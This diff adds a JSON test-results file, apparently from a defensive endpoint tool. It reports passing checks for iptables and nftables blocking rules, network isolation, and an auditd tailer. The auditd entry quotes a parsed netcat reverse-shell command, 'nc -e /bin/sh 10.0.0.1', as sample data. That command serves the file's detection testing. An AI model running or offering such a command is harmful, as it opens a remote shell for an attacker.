@@ -1,0 +1,28 @@
+{
+  "timestamp": 1791392347.272132,
+  "iptables": {
+    "real": true,
+    "details": [
+      "Successfully added live kernel iptables rule blocking 198.51.100.99:4444",
+      "Successfully released live iptables block",
+      "Successfully established live endpoint network isolation chain (DROP + management)",
+      "Successfully restored live network policy"
+    ],
+    "status": "PASS"
+  },
+  "nftables": {
+    "real": true,
+    "details": [
+      "Successfully added live nftables rule for 203.0.113.88:8080",
+      "Successfully flushed live nftables ruleset"
+    ],
+    "status": "PASS"
+  },
+  "auditd_tailer": {
+    "real": true,
+    "details": [
+      "Successfully tailed live audit record: parsed PID=4567, cmd=nc -e /bin/sh 10.0.0.1"
+    ],
+    "status": "PASS"
+  }
+}
